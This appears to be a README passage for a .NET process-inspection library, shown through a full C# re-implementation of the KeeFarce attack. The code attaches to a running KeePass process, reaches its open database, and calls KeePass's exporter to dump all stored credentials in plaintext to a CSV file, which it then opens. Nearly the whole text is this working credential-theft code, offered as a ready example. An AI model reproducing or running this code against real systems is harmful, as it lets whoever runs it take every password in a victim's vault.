To get the essence of how usefull this library can be, see below a re-implementation of [denandz/KeeFarce](https://github.com/denandz/KeeFarce).  
This example interacts with an open KeePass process and makes it export all credentials to a CSV file.  

```C#
// Gain foothold within the target process
RemoteApp remoteApp = RemoteAppFactory.Connect("KeePass.exe", RuntimeType.Managed);
RemoteActivator rActivator = remoteApp.Activator;

// Get a remote DocumentManagerEx object
IEnumerable<CandidateObject> candidates = remoteApp.QueryInstances("KeePass.UI.DocumentManagerEx");
RemoteObject remoteDocumentManagerEx = remoteApp.GetRemoteObject(candidates.Single());
dynamic dynamicDocumentManagerEx = remoteDocumentManagerEx.Dynamify();

// Get sensitive properties to dump
dynamic activeDb = dynamicDocumentManagerEx.ActiveDatabase;
dynamic rootGroup = activeDb.RootGroup;

// Create remote PwExportInfo object (Call Ctor)
RemoteObject pwExportInfo = rActivator.CreateInstance("KeePass.DataExchange.PwExportInfo", rootGroup, activeDb, true);

// Create remote KeePassCsv1x (Call Ctor)
RemoteObject keePassCsv1x = rActivator.CreateInstance("KeePass.DataExchange.Formats.KeePassCsv1x");
dynamic dynamicCsvFormatter = keePassCsv1x.Dynamify();

// Creating a remote FileStream object
string tempOutputFile = Path.ChangeExtension(Path.GetTempFileName(), "csv");
RemoteObject exportFileStream = rActivator.CreateInstance(typeof(FileStream), tempOutputFile, FileMode.Create);

// Calling Export method of exporter
dynamicCsvFormatter.Export(pwExportInfo, exportFileStream, null);

// Showing results in default CSV editor.
Console.WriteLine($"Output written to: {tempOutputFile}");
Process.Start(tempOutputFile);
```
